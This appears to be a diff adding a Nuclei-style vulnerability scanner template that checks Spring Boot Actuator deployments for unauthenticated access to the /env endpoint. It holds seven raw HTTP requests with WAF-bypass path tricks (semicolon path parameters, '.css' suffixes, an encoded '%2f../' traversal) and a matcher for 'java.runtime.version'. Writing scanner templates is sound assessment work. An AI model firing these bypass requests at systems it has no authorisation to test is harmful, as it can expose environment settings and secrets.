@@ -1,0 +1,44 @@
+id: spring-boot-actuator-unauthorized-access
+info:
+  name: Spring Boot Actuator Unauthorized Access Vulnerability (WAF Bypass)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: spring,unauthorized-access
+http:
+  - raw:
+      - |
+        GET {{BaseURL}}/actuator;/env;.css HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET {{BaseURL}}/api/actuator;/env;.css HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET {{BaseURL}}/api;/env;.css HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET {{BaseURL}};/env;.css HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET {{BaseURL}};/actuator;/env HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET {{BaseURL}}/actuator;x/env HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET {{BaseURL}}/actuator;%2f../env HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "java.runtime.version"
+          - "{"
